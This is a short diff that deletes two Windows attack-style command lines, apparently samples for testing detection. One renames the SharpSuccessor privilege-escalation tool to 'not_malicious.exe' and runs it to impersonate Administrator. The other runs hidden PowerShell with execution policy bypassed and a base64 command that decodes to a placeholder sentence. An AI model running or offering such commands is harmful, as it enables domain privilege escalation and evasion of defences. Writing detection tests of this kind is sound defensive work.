@@ -1,2 +1,0 @@
-copy SharpSuccessor.exe not_malicious.exe && not_malicious.exe /add /imp:Administrator /p:C:\Windows\System32 /acc:TestUser /n:DnsAdmin
-powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi
